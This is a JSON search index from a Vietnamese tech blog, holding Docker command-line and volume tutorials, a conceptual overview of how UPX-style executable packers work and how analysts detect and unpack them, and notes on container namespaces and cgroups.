\u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: {}, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/DISK1/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;DISK1\u0026#34;, \u0026#34;Options\u0026#34;: { \u0026#34;device\u0026#34;: \u0026#34;/home/edisc/Desktop/docker/data\u0026#34;, \u0026#34;o\u0026#34;: \u0026#34;bind\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;none\u0026#34; }, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] Để chạy container với tham số này ta không sử dụng tùy chọn --mount mà ta sẽ sủ dụng tùy chọn -v.\n1 2 3 4 5 6 7 8 9 10 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 About an hour ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it -v DISK1:/home/disk4 ubuntu:latest root@e94027a36d5b:/# cd /home/disk4/ root@e94027a36d5b:/home/disk4# ls c1.txt d.txt data_container2.txt root@e94027a36d5b:/home/disk4# Vào thư mục và kiểm tra, ta vẫn thấy nó có các dữ liệu ở trên máy host. Và khi thao tác dữ liệu trên này, dữ liệu trên máy host cũng sẽ được cập nhât.\nKết luận Trong bài học này, chúng ta đã học được từ anh XuanThuLabChanel những kiến thức như sau: Các lệnh Docker exec, lưu container thành image với commit, xuất image ra file:\ndocker exec: thực thi một lệnh bên trong container đang chạy từ host. docker commit: lưu container thành image docker save: lưu image thành file. docker load: chuyển file thành image.\nChia sẻ dữ liệu trong Docker, tạo và quản lý ổ đĩa docker volume: Chia sẻ dữ liệu qua tệp: Container với host Giữa container với nhau. Chia sẻ dữ liệu qua ổ đĩa disk: các thao tác với volume thông qua lệnh docker volume kèm các option tương ứng.\nKết thúc bài viết này, một lần nữa em xin chân thành gửi lời cảm ơn đến anh XuanThuLabChanel đã làm những bài học quý giá và bổ ích này. ","description":"Phần này chúng ta sẽ tìm hiểu lệnh Docker exec, lưu container thành image với commit, xuất image ra file; Chia sẻ dữ liệu trong Docker, tạo và quản lý ổ đĩa docker volume ","id":22,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P2)","uri":"https://minhlongmt183.github.io/posts/docker_p2/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rLàm quen với docker command line Khi làm việc với docker, lệnh chúng ta hay dùng đó chính là docker. Sau lệnh docker sẽ có nhiều lệnh nhỏ, để xem danh sách các lệnh nhỏ này, ta gõ\n1 $ docker 1 $ docker run -d -p 80:80 docker/getting-started Trong đó:\n-d: chạy container ở chế độ detached mode (ở background) -p 80:80: ánh xạ cổng 80 của host vào cổng 80 của container. docker/getting-started: image sử dụng Docker images Liệt kê các images 1 2 3 4 5 6 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB hello-world latest d1165f221234 3 months ago 13.3kB Ở đây,\nREPOSITORY là tên của image, TAG là phiên bản của image, IMAGE ID là một mã hash của image, CREATED là thời gian được tạo của image, SIZE là kích thước của image.\nCác images này lấy từ hub.docker.com. Chúng ta vào hub.docker.com để tìm kiếm image thích hợp mà mình muốn tải. Lưu ý nếu lần đầu bạn vào trang này, bạn cần đăng kí một tài khoản. Ngoài ra, ta có thể tìm kiếm trực tiếp trên terminal với lệnh: 1 docker search \u0026lt;keyword\u0026gt; Ví dụ, ta muốn tìm kiếm các images của ubuntu\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ❯ docker search ubuntu NAME DESCRIPTION STARS OFFICIAL AUTOMATED ubuntu Ubuntu is a Debian-based Linux operating sys… 12337 [OK] dorowu/ubuntu-desktop-lxde-vnc Docker image to provide HTML5 VNC interface … 539 [OK] websphere-liberty WebSphere Liberty multi-architecture images … 273 [OK] rastasheep/ubuntu-sshd Dockerized SSH service, built on top of offi… 253 [OK] consol/ubuntu-xfce-vnc Ubuntu container with \u0026#34;headless\u0026#34; VNC session… 241 [OK] ubuntu-upstart Upstart is an event-based replacement for th… 110 [OK] 1and1internet/ubuntu-16-nginx-php-phpmyadmin-mysql-5 ubuntu-16-nginx-php-phpmyadmin-mysql-5 50 [OK] open-liberty Open Liberty multi-architecture images based… 46 [OK] ubuntu-debootstrap debootstrap --variant=minbase --components=m… 44 [OK] i386/ubuntu Ubuntu is a Debian-based Linux operating sys… 25 nuagebec/ubuntu Simple always updated Ubuntu docker images w… 24 [OK] solita/ubuntu-systemd Ubuntu + systemd 24 [OK] 1and1internet/ubuntu-16-apache-php-5.6 ubuntu-16-apache-php-5.6 14 [OK] 1and1internet/ubuntu-16-apache-php-7.0 ubuntu-16-apache-php-7.0 13 [OK] 1and1internet/ubuntu-16-nginx-php-phpmyadmin-mariadb-10 ubuntu-16-nginx-php-phpmyadmin-mariadb-10 11 [OK] 1and1internet/ubuntu-16-nginx-php-5.6-wordpress-4 ubuntu-16-nginx-php-5.6-wordpress-4 9 [OK] 1and1internet/ubuntu-16-nginx-php-5.6 ubuntu-16-nginx-php-5.6 8 [OK] 1and1internet/ubuntu-16-apache-php-7.1 ubuntu-16-apache-php-7.1 7 [OK] 1and1internet/ubuntu-16-nginx-php-7.0 ubuntu-16-nginx-php-7.0 4 [OK] pivotaldata/ubuntu A quick freshening-up of the base Ubuntu doc… 4 pivotaldata/ubuntu16.04-build Ubuntu 16.04 image for GPDB compilation 2 pivotaldata/ubuntu-gpdb-dev Ubuntu images for GPDB development 1 smartentry/ubuntu ubuntu with smartentry 1 [OK] 1and1internet/ubuntu-16-sshd ubuntu-16-sshd 1 [OK] 1and1internet/ubuntu-16-php-7.1 ubuntu-16-php-7.1 1 [OK] Mục OFFICIAL cho biết phiên bản này là chính chủ. Để sử dụng một image nào đó, chúng ta cần đọc thông tin của image trên hub.docker và các phiển bản của image nằm ở phần tag.\nTải image Để tải image, ta sử dụng:\n1 docker pull image:tag Ở đây, tag là phiên bản mà chúng ta muốn sử dụng. Nếu chúng ta muốn tải bản ubuntu 20.04 thì câu lệnh sẽ là:\n1 2 3 4 ❯ docker pull ubuntu:20.04 20.04: Pulling from library/ubuntu Digest: sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d Status: Downloaded newer image for ubuntu:20.04 Chúng ta kiểm tra lại để xác nhận docker đã được tải bằng lệnh docker images\n1 2 3 4 5 6 7 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu 20.04 7e0aa2d69a15 6 weeks ago 72.7MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB hello-world latest d1165f221234 3 months ago 13.3kB Khi chúng ta không để tag, mặc định nó xem như tag này là latest và sẽ tải bản mới nhất về, và khi chúng ta in ra các images, những images này sẽ có tag là latest.\n1 2 3 4 5 6 ❯ docker pull centos Using default tag: latest latest: Pulling from library/centos 7a0437f04f83: Pull complete Digest: sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1 Status: Downloaded newer image for centos:latest Xóa Image Để xóa một image không sử dụng, chúng ta dùng câu lệnh:\n1 docker image rm \u0026lt;ten_image_muon_xoa:tag\u0026gt; Ví dụ, tôi muốn xóa image ubuntu:20.04, ta làm như sau:\n1 2 ❯ docker image rm ubuntu:20.04 Untagged: ubuntu:20.04 Kết quả sau khi xóa:\n1 2 3 4 5 6 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB hello-world latest d1165f221234 3 months ago 13.3kB Ngoài ra, chúng ta còn có thể xóa bằng cách dùng IMAGE ID, ví dụ, ta muốn xóa image hello-world,\n1 2 3 4 5 6 7 8 9 10 ❯ docker image rm d1165f221234 Untagged: hello-world:latest Untagged: hello-world@sha256:5122f6204b6a3596e048758cabba3c46b1c937a46b5be6225b835d091b90e46c Deleted: sha256:d1165f2212346b2bab48cb01c1e39ee8ad1be46b87873d9ca7a4e434980a7726 Deleted: sha256:f22b99068db93900abe17f7f5e09ec775c2826ecfe9db961fea68293744144bd ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB Docker version Usage 1 $ docker version [OPTIONS] Get the server version 1 $ docker version --format \u0026#39;{{.Server.Version}}\u0026#39; Dump raw JSON data 1 $ docker version --format \u0026#39;{{json .}}\u0026#39; Print the current context 1 $ docker version --format=\u0026#39;{{.Client.Context}}\u0026#39; Docker run Image sẽ đươc chạy trong các container, để chạy ta thực hiện câu lệnh:\nUsage: 1 $ docker run [OPTIONS] IMAGE [COMMAND] [ARG...] Có rất nhiều tham số, các bạn có thể đọc ở đây Ví dụ: Chạy một image 1 docker run -it \u0026lt;ten_image/image_id\u0026gt; Ở đây, -it là viết gọn của 2 options: -i (interactive) và -t (terminal) chỉ định tạo ra container và có thể tương tác với nó trực tiếp trên terminal. Giả sử ta chạy image ubuntu:latest.\n1 2 ❯ docker run -it ubuntu:latest root@b2d8e983bcef:/# Vậy là chúng ta đã chạy image ubuntu:latest và đang ở container ubuntu, tài khoản root với hostname là b2d8e983bcef. Chúng ta kiểm tra thông tin của ubuntu này.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@ff7140c65b73:/# cat /etc/*release DISTRIB_ID=Ubuntu DISTRIB_RELEASE=20.04 DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 20.04.2 LTS\u0026#34; NAME=\u0026#34;Ubuntu\u0026#34; VERSION=\u0026#34;20.04.2 LTS (Focal Fossa)\u0026#34; ID=ubuntu ID_LIKE=debian PRETTY_NAME=\u0026#34;Ubuntu 20.04.2 LTS\u0026#34; VERSION_ID=\u0026#34;20.04\u0026#34; HOME_URL=\u0026#34;https://www.ubuntu.com/\u0026#34; SUPPORT_URL=\u0026#34;https://help.ubuntu.com/\u0026#34; BUG_REPORT_URL=\u0026#34;https://bugs.launchpad.net/ubuntu/\u0026#34; PRIVACY_POLICY_URL=\u0026#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\u0026#34; VERSION_CODENAME=focal UBUNTU_CODENAME=focal root@ff7140c65b73:/# Để kiểm tra có những container nào đang chạy trên máy, chúng ta dùng lệnh:\n1 2 3 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 2 minutes unruffled_goldberg Kết quả trên cho thấy, hệ thống đang chạy một container có id là ff7140c65b73 và chạy từ image ubuntu:latest, với command /bin/bash.\nKhi chúng ta gõ lệnh exit để thoát khỏi container, lệnh docker ps sẽ không hiển thị container nào, tuy nhiên, lệnh docker ps -a sẽ liệt kê tất cả các container đang hiện có trên máy kèm theo trạng thái của nó.\n1 2 3 4 ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 9 minutes ago Exited (0) 5 seconds ago unruffled_goldberg b2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; 11 minutes ago Exited (0) 11 minutes ago gallant_snyder Trạng thái Exited thể hiện container đã bị dừng, và để khởi động lại docker đã dừng, ta dùng lệnh docker start\n1 2 3 4 5 6 7 8 9 ❯ docker start ff7140c65b73 ff7140c65b73 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 12 minutes ago Up 6 seconds unruffled_goldberg ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 12 minutes ago Up 11 seconds unruffled_goldberg b2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; 14 minutes ago Exited (0) 14 minutes ago gallant_snyder Để vào lại hệ điều hành trong container, ta dùng lệnh docker attach container_id, lưu ý, id chúng ta không cần ghi hết, chỉ cần ghi 2-3 chữ cái đầu là được.\n1 2 ❯ docker attach ff root@ff7140c65b73:/# Để thoát khỏi container mà không dừng nó, ta dùng tổ hợp phím ctrl + P, ctrl + Q. Khi chúng ta dùng tổ hợp này, ta sẽ có kết quả sau:\n1 2 ❯ docker attach ff root@ff7140c65b73:/# read escape sequence Từ máy host, để dừng container, ta dùng lệnh docker stop \u0026lt;container_name/container_id\u0026gt;\n1 2 3 4 5 6 7 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 26 minutes ago Up 14 minutes unruffled_goldberg ❯ docker stop unruffled_goldberg unruffled_goldberg ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES Đặt tên cho container 1 2 ❯ docker run -it --name \u0026#34;centos_docker\u0026#34; -h centos1 centos:latest [root@centos1 /]# Ví dụ trên chạy container có tên là centos_docker sử dụng image centos:latest.\n-it tạo một tương tác bash shell trong container. --name: đặt tên cho container. -h: đặt hostname cho container.\nChúng ta có thể kiểm tra 1 2 3 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 3 seconds centos_docker Capture container ID (\u0026ndash;cidfile) 1 2 3 4 5 6 7 8 9 ❯ docker run --cidfile /tmp/docker_test.cid ubuntu echo \u0026#34;test\u0026#34; Unable to find image \u0026#39;ubuntu:latest\u0026#39; locally latest: Pulling from library/ubuntu 345e3491a907: Pull complete 57671312ef6f: Pull complete 5e9250ddb7d0: Pull complete Digest: sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d Status: Downloaded newer image for ubuntu:latest test Lệnh này tạo container và in test ra màn hình console. Flag cidfile yêu cầu Docker tạo một file mới và\nviết container ID vào nó. Nếu file đã tồn tại, Docker sẽ trả về error. Docker sẽ đóng file khi docker run kết thúc. Full container capabilities (\u0026ndash;privileged) 1 2 3 4 ❯ docker run -t -i --rm ubuntu bash root@bd1340e91d1e:/# mount -t tmpfs none /mnt mount: /mnt: permission denied. root@bd1340e91d1e:/# --rm tự động xóa container nếu như nó đã tồn tại. Lệnh này không hoạt động, vì theo mặc định, những câu lệnh đem lại khả năng nguy hiểm tới kernel sẽ bị loại bỏ, bao gồm cap_sys_admin (lệnh yêu cầu mount filesystems). Tuy nhiên, flag --privileged sẽ cho phép chúng ta run: 1 2 3 4 5 6 7 8 9 10 11 ❯ docker run -t -i --privileged ubuntu bash root@a3c5921afbbc:/# mount -t tmpfs none /mnt root@a3c5921afbbc:/# df -h Filesystem Size Used Avail Use% Mounted on overlay 110G 58G 46G 56% / tmpfs 64M 0 64M 0% /dev tmpfs 3.9G 0 3.9G 0% /sys/fs/cgroup /dev/sda2 110G 58G 46G 56% /etc/hosts shm 64M 0 64M 0% /dev/shm none 3.9G 0 3.9G 0% /mnt root@a3c5921afbbc:/# flag --privileged sẽ cấp hết tất cả capabilities cho container, và loại bỏ mọi giới hạn được đặt ra bởi cgroup controller. Nói cách khác, container có thể chạy hầu hết mọi thứ mà máy host có thể làm. Set working directory (-w) 1 $ docker run -w /path/to/dir/ -i -t ubuntu pwd -w cho phép câu lệnh thực thi bên trong thư mục đã chỉ định. Nếu đường dẫn tới thư mục không tồn tại,\nnó sẽ tạo một thư mục mới trong container tương ứng đường dẫn đó. Set storage driver options per container 1 $ docker run -it --storage-opt size=120G fedora /bin/bash size cho phép chúng ta thiết lập container rootfs size tới 120G tại thời điểm tạo.\nOption này chỉ hiệu quả cho devicemapper, btrfs, overlay2, windowsfilter và zfs graph drives\nVới devicemapper, btrfs, windowsfilter and zfs graph drivers user không thể gán kích thước\nnhỏ hơn Default BasFS Size\nVới overlay2 storage drive, size option chỉ hoạt động nếu trình fs được gán là xfs\nvà mounted với option pquota. trường hợp này, người dùng có thể cấp size.\nMount tmpfs (\u0026ndash;tmpfs) 1 $ docker run -d --tmpfs /run:rw,noexec,nosuid,size=65536k my_image flag --tmpfs mount một empty tmpfs vào container với rw, noexec, nosuid, size=65536k\nMount volume (-v, \u0026ndash;read-only) 1 $ docker run -v `pwd`:`pwd` -w `pwd` -i -t ubuntu pwd -v mount thư mục hiện tại vào container -w cho phép command được thực thi bên trong thư mục hiện tại bằng cách thay đổi trong thư mục\nthành giá trị được trả về bởi pwd. Nó sẽ thực thi kết hợp câu lệnh sử dụng container,\nnhưng bên trong thư mục hiện tại: 1 $ docker run -v /doesnt/exist:/foo -w /foo -i -t ubuntu bash Khi host directory của bind-mounted volume không tồn tại, Docker sẽ tự động tạo thư mục này trên host cho bạn.\nTrong ví dụ trên, Docker sẽ tạo thư mục /doesnt/exist trước khi chạy container.\n1 $ docker run --read-only -v /icanwrite busybox touch /icanwrite/here --read-only để kiểm soát nơi container viết file, --read-only flag mount container\u0026rsquo;s root filesystem chỉ để đọc. 1 $ docker run -t -i -v /var/run/docker.sock:/var/run/docker.sock -v /path/to/static-docker-binary:/usr/bin/docker busybox sh Bằng cách liên kết docker unix socket với docker binary liên kết tĩnh, chúng ta cấp container toàn quyền truy cập\nvà chỉnh sửa host\u0026rsquo;s Docker daemon.\nAdd bind mounts or volumes using the \u0026ndash;mount flag Ví dụ: 1 $ docker run --read-only --mount type=volume,target=/icanwrite busybox touch /icanwrite/here 1 $ docker run -t -i --mount type=bind,src=/data,dst=/data busybox sh Publish or expose port (-p, \u0026ndash;expose) 1 $ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash Câu lệnh kết nối cổng 8080 của container tới cồng 80 TCP trên 127.0.0.1 của host machine.\nChúng ta có thể chỉ định udp và sctp ports.\nCó một lưu ý, những port không ràng buộc bởi host sẽ có thể được truy cập từ bên ngoài.\nĐiều này cũng áp dụng nếu chúng ta muốn cấu hình UFW để chặn công cụ này, vì Docker quản lý các quy tác iptables\ncủa riêng mình.\n1 $ docker run --expose 80 ubuntu bash Hiển thị cổng 80 của container mà không có xuất hiện port trên host system.\nSet environment variables (-e, \u0026ndash;env, \u0026ndash;env-file) 1 docker run -e MYVAR1 --env MYVAR2=foo --env-file ./env.list ubuntu bash Sử dụng những flag -e, --env, --env-file để thiết lập những biến môi trường (không phải dạng array)\ncho container bạn đang chạy, hoặc ghi đè những file đó có sẵn. ví dụ:\n1 2 3 ❯ docker run --env VAR1=value1 --env VAR2=value2 ubuntu env | grep VAR VAR2=value2 VAR1=value1 Connect a container to a network (\u0026ndash;network) 1 $ docker run -itd --network=my-net busybox Chúng ta có thể chọn địa chỉ IP cho container với flag --ip hoặc --ip6 khi bạn chạy container\ntrên user-defined network\n1 $ docker run -itd --network=my-net --ip=10.10.9.75 busybox Docker rm Để xóa container khi nó đang dừng, ta dùng lệnh docker rm container_id\n1 2 3 4 5 6 7 8 9 10 11 ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 9 minutes ago Exited (0) 7 minutes ago centos_docker ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) 45 minutes ago unruffled_goldberg b2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) About an hour ago gallant_snyder ❯ docker rm b2 b2 ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 10 minutes ago Exited (0) 7 minutes ago centos_docker ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) 45 minutes ago unruffled_goldberg Trường hợp container đang chạy mà ta muốn xóa thì ta thêm options -f\n1 docker rm -f container_id/container_name Tổng kết Trong bài học này, chúng ta đã học được từ anh XuanThuLabChanel những kiến thức như sau:\ndocker images: Liệt kê danh sách tất cả các images trên docker docker pull image:tag tải image về máy docker image rm image_name/image_id xóa image docker version: xem version của docker docker run -it --name \u0026quot;ten_container\u0026quot; -h \u0026quot;host_name\u0026quot; image: tạo container. ctrl + P, ctrl + Q: thoát khỏi container nhưng vẫn để container chạy. docker ps: in ra container chạy docker stop container_id/name: buộc container đang chạy dừng khi ta đang ở host. docker attach container_id/name: trở lại container đang chạy. docker rm containerid/name: xóa container đã dừng. docker rm -f containerid/name: xóa container đang chạy.\nKết thúc bài viết này, một lần nữa em xin chân thành gửi lời cảm ơn đến anh XuanThuLabChanel đã làm những bài học quý giá và bổ ích này. ","description":"Bài này chúng ta sẽ học làm quen với docker command line, một số câu lệnh thông dụng như docker images, docker version, docker run, docker rm","id":23,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P1)","uri":"https://minhlongmt183.github.io/posts/docker_p1/"},{"content":"Nguồn tham khảo\nWhat is Packing? Packing có nghĩa là nén (compressed), hoặc xáo trộn (obfuscated) file thực thi để làm cho file thực thi khó phát hiện, khó phân tích tĩnh, khó dịch ngược. Trong ngữ cảnh của malware, vì mã độc chủ yếu được compressed, obfuscated trong các mẫu đóng gói, các công cụ dùng để phân tích tĩnh sẽ gặp vấn đề khi xác định liệu tệp nhị phân này có phải là mã độc hay không. Bên cạnh nó, một thuật toán packing tốt sẽ làm khó khăn qúa trình phân tích của các nhà phân tích mã độc, từ đó giúp cho vòng đời của mã độc được kéo dài lâu hơn.\nMột cách nôm na, chúng ta có thể hiểu packer gồm: compressing packers và encrypting packers. Trong đó compressing packers mục đích là đưa file thực thi về dạng nén, làm giảm kích thước của file, còn encrypting packers có mục đích mã hóa hoặc xáo trộn file đã được nén, nhằm ngăn chặn người dùng dịch ngược. Như đã nói, cách hiểu trên chỉ là hiểu một cách nôm na, bởi vì có nhiều packer kết hợp cả hai tính chất trên, còn có nhưng packer (như UPX), nó chỉ compressing mà không có encrypting.\nHow does packing work? Chúng ta sẽ nói về kiến trúc \u0026ldquo;stub-payload\u0026rdquo;, một trong những cơ chế được sử dụng nhiều bởi packer, kể cả UPX.\nTrong kiến trúc \u0026ldquo;stub-payload\u0026rdquo;, một file thực thi sẽ gồn hai thành phần chính: nội dung đã được nén / mã hóa từ file gốc và một đoạn mã dùng để giải nén / giải mã file này về file gốc và thực thi nó. Đoạn mã này được gọi là stub. Về bản chất, file ban đầu được nến / mã hóa, sau đó được bọc trong tệp thực thi mới có chứa mã để đưa nó về trạng thái ban đầu\nIndication of Packing Lacking of Import in Import Address Table (IAT) Để một file thực thi có thể tương tác với hệ điều hành thì file thực thi cần phải có các hàm được tích hợp vào thư viện hệ thống như kernel32.dll và user32.dll. Khi phân tích một tệp tin đã được giải nén hoàn toàn, ta sẽ thấy một số lượng lớn các import vì mã độc rõ ràng muốn tương tác khá nhiều với hệ điều hành. Tuy nhiên, một stub của một chương trình bị packed không có nhiều chức năng ngoài việc giải nén và thực thi file gốc, do đó, nó sẽ có số lượng import ít hơn rất nhiều so với file chuẩn.\nNon-standard Section Names: Trong những file thực thi bình thường, chúng thường có các sections giống nhau mọi lúc (.text, .data, .rsrc,..). Tuy nhiên, những paker sẽ tự định nghĩa section cho riêng nó, điều này cũng cho thấy những file có section như vậy sẽ không phải là tiêu chuẩn và có thể được đóng gói. Ví dụ như UPX packer sẽ thực thi với các file có tên section là UPX0 và UPX1.\nSections with a small raw size but a large virtual size Khi chúng ta gặp một file mà có raw size rất nhỏ (đôi khi bằng 0), điều này muốn nói file thực thi không có bất kì dữ liệu nào trong section. Tuy nhiên, khi file thực thi được load vào bộ nhớ, raw size không còn liên quan, và nó được thay bởi virtual size của từng phần cụ thể được cấp phát trong memory. Nếu một file có section được cấp phát với virtual space lớn và raw data rất nhỏ, nó có khả năng cao là những đoạn code dùng để unpacked.\nSections with very high entropy: Từ entroy đề cập đến phương sai và tính ngẫu nhiên của một phần dữ liệu. Những thứ như ngôn ngữ Tiếng Anh, assembly code, các cấu trúc giao tiếp được xác định rõ ràng khác thường có entropy thấp vì ngôn ngữ có xu hướng tuần theo các mẫu có thể đoán trước được. Tuy nhiên, encrypted data và compressed data không có khả năng dự đoán trước, do đó có entropy cao hơn nhiều. Do đó, khi kiểm tra nếu thấy có entropy cao thì khả năng dữ liệu này đã được nén hoặc mã hóa.\nLow number of discernible strings: Trong file không bị nén, chúng ta sẽ nhận thấy có một lượng nhất định các chuỗi có thể đọc được vì hầu hết các ứng dụng (kể cả malware) sử dụng những protocol được hiện thực bởi ngôn ngữ con người. Do đó, trong một file bình thường, những chuỗi này nên xuất hiện, và khi thấy những chuỗi có thể đọc được ở một file quá ít hoặc không có, khả năng cao file này đã bị nén hoặc bị mã hóa.\nSections with RWX privileges: Trong các file bình thường, một section sẽ rất ít khi được cho phép cả đọc và ghi, vì chúng ta hiếm khi muốn viết đè file thực thi trong ứng dụng của mình. Ngoài ra, hiếm khi viết trực tiếp vào file thực thi trong lúc nó đang chạy. Do đó, không có lý do nào để section được cấp quyền vừa ghi và vừa đọc ngoại trừ packer. Với packer, dữ liệu sau khi giải nén sẽ được ghi vào section rồi thực thi.\njmp or call Instructions to registers/strange memory addresses: Trên nhiều packers, địa chỉ tới nơi dữ liệu đã được giải nén thường được lưu trên các thanh ghi và địa chỉ đó thường nằm trong một section khác, do dó chúng ta sẽ thấy bước này nhảy rất xa. Các bước nhảy xa như thế thường không phổ biến, vì tất cả các mã thực thi trong hệ nhị phân thường được chứa trong một section duy nhất. Nếu chúng ta thấy một lệnh jump / call đến một địa chỉ mà:\n1. Không có trong section hiện tại\n2. Không có trong không gian địa chỉ của một thư viện đã tải.\nthì khả năng cao bước nhảy này là bước giải nén.\nNhận diện với file được mã hóa bằng UPX Các bước giúp chúng ta nhận diện và giải nén file bị mã hóa bằng UPX:\nKiểm tra PE header và xác định xem chúng có thực sự bị đóng gói không. Tuy nhiên bước xác định này chúng ta có thể dùng peid. Tìm nơi giải nén sẽ được ghi. Tìm kiếm lệnh jmp hoặc call tham chiếu đến một thanh ghi hoặc không gian bộ nhớ nơi lưu dữ liệu giải nén có thể được ghi vào trong mã gốc. Đặt breakpoint ở những lệnh này. Dump data chứa trong không gian bộ nhớ đó, sửa import resolutions và xuất nó dưới dạng tệp thực thi mới. Áp dụng. Ta áp dụng với bài garbage của flareon-2020.\n","description":"Packer là một chương trình dùng để nén và che dấu file thực thi của mình. Nó được sử dụng nhằm giúp các developer giấu đi file thực thi của mình, để làm khó các reverser khiến họ khó khăn trong quá trình bẻ khóa chương trình của mình. Tuy nhiên ứng dụng cũng như kĩ thuật này cũng được sử dụng để tạo ra mã độc, và nó cũng gây ra nhiều khó khăn cho các nhà phân tích mã độc trong quá trình nghiên cứu.","id":24,"section":"posts","tags":["Malware, flareon"],"title":"Manually Unpacking UPX Executables (vẫn đang update...)","uri":"https://minhlongmt183.github.io/posts/packet/"},{"content":"Container Basics Chúng ta sẽ đi qua một số khái niệm cơ bản và cần thiết trong docker:\nCredentials Credentials describe the user identity of a task, which determine its permission for shared resources such as files, semaphores, and shared memory.\nCapabilities Since kernel 2.2, Linux divides the privileges associated with superuser into distinct unit known as capabilities\n1 /proc/$PID/status | man capabilities Filesystem The container\u0026rsquo;s root mount is often planted in a container-specialized filesystem, such as OverlayFS\n1 /var/lib/docker/overlay2/..hash../diff Namespaces Mục đích: làm cho hệ thống container có thể sử dụng và an toàn. PID: have their own view of tasks - cung cấp cây không gian tên của process id. Nó cho phép mỗi container có một cây đầy đủ các process id riêng biệt, trong đó init process có pid = 1. Process chạy trên host sẽ có pid khác với khi chạy trên container. User: wrap mapping of UID to user - cung cấp phiên bản namespace của User IDs (UIDs) and Group IDs (GIDs). Đây là một trong những tính năng quan trọng nhất của hệ thống container hiện đại vì nó được sử dụng để cung cấp \u0026ldquo;unprivileged containers\u0026rdquo;. User namespaces cung cấp một trong những nền tản cho hệ thống container trên Linux hiện nay, và là vùng cấu hình duy nhất được LXC coi là an toàn. Mount: isolate mount points - cung cấp chế độ xem không gian tên của các điểm kết nối (mount points). Kết hợp với pivot_root syscall, tính năng này sẽ cô lập container\u0026rsquo;s filesystem với host\u0026rsquo;s filesystem. Network: cung cấp không gian tên và ngăn xếp mạng riêng biệt. Hầu hết các trường hợp sử dụng của container liên quan tới dịch vụ mạng, vì vậy nó được coi là tính năng lõi của container. UTS: have their own hostname - cung cấp namespaced version của định danh hệ thống (system identifies) IPC: restrict SysV IPC objects Cgroup: isolate the view of cgroups 1 /proc/$PID/ns/ Cgroups CGroups: cung cấp giao diện phân cấp để quản lí cũng như đo lường tài nguyên và quyền truy cập của thiết bị. Cgroups có thể được sử dụng bởi các process có quyền hạn cao (higher privileged) để đặt giới hạn về sử dụng bộ nhớ, CPU, chặn các thiết bị IO khác. Chúng còn có thể được sử dụng chung với iptables để cung cấp định hình lưu lượng. Quan trong nhất, chúng được sử dụng trong hệ thống container đẻ kiểm soát quyền truy cập của các thiết bị.\nLinux Security Modules - LSMs AppArmor and SELinux are Linux security modules providing Mandatory 